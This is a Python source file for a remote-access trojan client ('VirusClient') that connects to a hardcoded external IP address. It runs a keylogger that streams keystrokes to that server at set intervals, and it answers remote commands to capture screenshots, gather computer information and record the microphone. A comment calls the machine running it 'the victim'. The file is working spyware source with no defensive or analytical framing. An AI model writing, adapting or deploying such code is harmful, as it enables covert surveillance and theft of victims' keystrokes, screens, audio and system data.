import socket
import threading
import time

from Actions import Actions
from keylogger import KeyLogger

HEADER = 2048
PORT = 5050
FORMAT = 'utf-8'
SERVER = '5.29.17.38'
ADDR = (SERVER, PORT)


class VirusClient:
    def __init__(self, sock=None):
        if sock is None:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            self.sock = sock

        self.interval = 3  # Default values
        self.keylogger = KeyLogger()
        self.keylogger.start()

        self.lock = threading.Lock()


    def connect(self, host, port):
        self.sock.connect((host, port))
        keylogger_thread = threading.Thread(target=self.push_keylogger_update)
        keylogger_thread.start()

    def push_keylogger_update(self):
        start_time = time.perf_counter()
        diff = 1
        while True:
            if diff % self.interval == 0:
                data = self.keylogger.report()
                self.send_data(data, 'keylogger')
                time.sleep(1)  # Send once a second
            diff = int(time.perf_counter() - start_time)  # Time gone from start

    def send_data(self, data, identifier):
        self.lock.acquire()

        # sending the id of the file first
        send_file_name = identifier.encode()
        send_file_name += b' ' * (HEADER - len(send_file_name))
        self.sock.send(send_file_name)

        # sending the length of the data
        send_length = str(len(data)).encode()
        send_length += b' ' * (HEADER - len(send_length))
        self.sock.send(send_length)

        # sending the data
        self.sock.send(data)

        self.lock.release()

    ''' The side of the victim only receives actions he has to do and send 
    that's why assume that we received a action
    '''

    def respond_to_command(self):
        msg = self.sock.recv(HEADER)
        print('Received ->', msg)
        if msg == b'':
            raise RuntimeError("socket connection broken")
        action = msg.decode().replace(" ", "")
        if action == "screenshot":
            self.send_data(*Actions.screenshot())
        elif action == "pcinfo":
            self.send_data(*Actions.computer_information())
        elif "audio" in action:
            mic_time = int(action.replace('audio', ''))
            self.send_data(*Actions.microphone(mic_time))
        elif "keylogger" in action:

            self.interval = int(action.replace('keylogger', ''))
        else:
            print("something went wrong")


conn = VirusClient()
conn.connect(*ADDR)
while True:
    conn.respond_to_command()
